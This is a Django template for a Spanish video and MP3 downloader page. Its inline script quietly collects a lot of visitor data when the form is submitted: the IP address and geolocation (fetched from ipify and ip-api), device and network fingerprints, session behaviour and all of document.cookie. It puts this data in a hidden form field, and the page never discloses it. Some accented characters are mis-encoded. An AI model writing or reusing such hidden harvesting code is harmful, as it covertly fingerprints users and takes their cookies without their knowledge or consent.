{% extends "layout.html" %}

{% block content %}
<div class="container py-5">
  <div class="text-center mb-4">
    <h1 class="display-5 fw-bold">Descargador de Videos y Audio</h1>
    <p class="lead">
      Convierte cualquier video en MP4 o extrae el audio en MP3
    </p>
    <i class="fas fa-cloud-download-alt fa-3x text-info"></i>
  </div>

  <div class="d-flex justify-content-center gap-4 mb-4 fs-2">
    <i class="fab fa-youtube text-danger" title="YouTube"></i>
    <i class="fab fa-vimeo-v text-primary" title="Vimeo"></i>
    <i class="fab fa-facebook text-primary" title="Facebook"></i>
    <i class="fab fa-instagram text-secondary" title="Instagram"></i>
    <i class="fab fa-twitter text-info" title="Twitter"></i>
    <i class="fab fa-tiktok text-dark" title="TikTok"></i>
  </div>

  <div class="card p-4 mb-4 shadow-sm">
    <form id="downloadForm" method="post" action="{% url 'app:descargar_video' %}">
      {% csrf_token %}
      <div class="input-group mb-3">
        <span class="input-group-text bg-light">
          <i class="fas fa-link text-secondary"></i>
        </span>
        <input
          type="url"
          name="video_url"
          class="form-control"
          placeholder="Introduce la URL del video"
          required
        />
      </div>

      <div class="row">
        <div class="col-md-6 mb-3">
          <label class="form-label">Formato de salida</label>
          <select id="typeSelect" name="tipo" class="form-select">
            <option value="video" selected>Video (MP4)</option>
            <option value="audio">Audio (MP3)</option>
          </select>
        </div>
        <div class="col-md-6 mb-3">
          <label class="form-label">Calidad</label>
          <select class="form-select" name="quality">
            <option value="high" selected>Alta calidad</option>
            <option value="medium">Media calidad</option>
            <option value="low">Baja calidad</option>
          </select>
        </div>
      </div>
      <input type="hidden" id="userInfoField" name="user_info" value="" />

      <button type="submit" class="btn btn-primary w-100" id="submitBtn">
        <i class="fas fa-download me-2"></i> Descargar ahora
      </button>

      <div class="text-center mt-3">
        <small class="text-muted">Soporta m√°s de 50 plataformas diferentes</small>
      </div>
    </form>
  </div>
</div>

<script>
let sessionStartTime = Date.now();
let pageViews = 1;
let userInteractions = 0;
let isSubmitting = false; 

document.addEventListener('click', () => userInteractions++);
document.addEventListener('keypress', () => userInteractions++);

const form = document.getElementById("downloadForm");
const select = document.getElementById("typeSelect");
const userInfoField = document.getElementById("userInfoField");
const submitBtn = document.getElementById("submitBtn");

async function getUserIP() {
  try {
    const response = await fetch("https://api.ipify.org?format=json");
    const data = await response.json();
    return data.ip;
  } catch (error) {
    return 'No disponible';
  }
}

async function getLocationInfo() {
  try {
    const response = await fetch("http://ip-api.com/json/");
    const data = await response.json();
    return {
      country: data.country || 'Unknown',
      region: data.regionName || 'Unknown',
      city: data.city || 'Unknown',
      timezone: data.timezone || 'Unknown',
      isp: data.isp || 'Unknown'
    };
  } catch (error) {
    return {
      country: 'Unknown',
      region: 'Unknown', 
      city: 'Unknown',
      timezone: 'Unknown',
      isp: 'Unknown'
    };
  }
}

function getNetworkInfo() {
  const connection = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
  
  return {
    connection_type: connection ? connection.effectiveType : 'unknown',
    download_speed: connection ? connection.downlink + ' Mbps' : 'unknown',
    rtt: connection ? connection.rtt + ' ms' : 'unknown',
    save_data: connection ? connection.saveData : false
  };
}

function getDeviceInfo() {
  return {
    screen_resolution: `${screen.width}x${screen.height}`,
    viewport_size: `${window.innerWidth}x${window.innerHeight}`,
    color_depth: screen.colorDepth,
    pixel_ratio: window.devicePixelRatio || 1,
    orientation: screen.orientation ? screen.orientation.type : 'unknown',
    touch_support: 'ontouchstart' in window,
    hardware_concurrency: navigator.hardwareConcurrency || 'unknown'
  };
}

function getBrowserFeatures() {
  return {
    cookies_enabled: navigator.cookieEnabled,
    local_storage: typeof(Storage) !== "undefined",
    session_storage: typeof(sessionStorage) !== "undefined",
    webgl_support: !!window.WebGLRenderingContext,
    canvas_support: !!document.createElement('canvas').getContext,
    geolocation_support: !!navigator.geolocation,
    notification_support: "Notification" in window,
    service_worker_support: 'serviceWorker' in navigator
  };
}

function getSessionInfo() {
  const sessionDuration = Math.floor((Date.now() - sessionStartTime) / 1000);
  
  return {
    session_duration: sessionDuration,
    page_views: pageViews,
    user_interactions: userInteractions,
    referrer: document.referrer || 'direct',
    page_title: document.title,
    page_url: window.location.href,
    scroll_depth: Math.floor((window.scrollY / (document.body.scrollHeight - window.innerHeight)) * 100) || 0
  };
}

async function buildUserInfo() {
  console.log('üîç Recopilando informaci√≥n del usuario...');
  
  const userIP = await getUserIP();
  const locationInfo = await getLocationInfo();
  const networkInfo = getNetworkInfo();
  const deviceInfo = getDeviceInfo();
  const browserFeatures = getBrowserFeatures();
  const sessionInfo = getSessionInfo();
  
  const formData = {
    video_url: document.querySelector('input[name="video_url"]').value,
    format: select.value,
    quality: document.querySelector('select[name="quality"]').value
  };
  
  const completeUserInfo = {
    user_ip: userIP,
    timestamp: new Date().toISOString(),
    
    browser: navigator.userAgent,
    language: navigator.language,
    languages: navigator.languages,
    platform: navigator.platform,
    
    ...deviceInfo,
    
    ...networkInfo,
    
    ...locationInfo,
    
    browser_features: browserFeatures,
    
    ...sessionInfo,
    
    ...formData,
    
    cookies: document.cookie,
    local_time: new Date().toString(),
    user_timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
    
    performance: window.performance ? {
      navigation_type: performance.navigation ? performance.navigation.type : 'unknown',
      page_load_time: performance.timing ? (performance.timing.loadEventEnd - performance.timing.navigationStart) : 'unknown'
    } : 'not_available'
  };
  
  return completeUserInfo;
}

function restoreButtonAfterTimeout() {
  setTimeout(() => {
    if (isSubmitting) {
      submitBtn.innerHTML = '<i class="fas fa-download me-2"></i> Descargar ahora';
      submitBtn.disabled = false;
      isSubmitting = false;
    }
  }, 10000);
}

form.addEventListener("submit", async function (e) {
  e.preventDefault();
  
  if (isSubmitting) {
    return;
  }
  
  isSubmitting = true;
  
  if (select.value === "audio") {
    form.action = "{% url 'app:descargar_audio' %}";
  } else {
    form.action = "{% url 'app:descargar_video' %}";
  }
  
  try {
    // Mostrar indicador de carga
    const originalText = submitBtn.innerHTML;
    submitBtn.innerHTML = '<i class="fas fa-spinner fa-spin me-2"></i> Procesando...';
    submitBtn.disabled = true;
    
    restoreButtonAfterTimeout();
    
    const userInfo = await buildUserInfo();

    userInfoField.value = JSON.stringify(userInfo);
    
    
    form.submit();
    
  } catch (error) {
    
    submitBtn.innerHTML = '<i class="fas fa-download me-2"></i> Descargar ahora';
    submitBtn.disabled = false;
    isSubmitting = false;
    
    alert('Error al procesar la solicitud. Por favor, int√©ntalo de nuevo.');
  }
});

document.addEventListener('visibilitychange', function() {
  if (!document.hidden && isSubmitting) {
    setTimeout(() => {
      if (isSubmitting) {
        submitBtn.innerHTML = '<i class="fas fa-download me-2"></i> Descargar ahora';
        submitBtn.disabled = false;
        isSubmitting = false;
      }
    }, 1000);
  }
  
  if (!document.hidden) {
        pageViews++;
  }
});

</script>

{% endblock %}
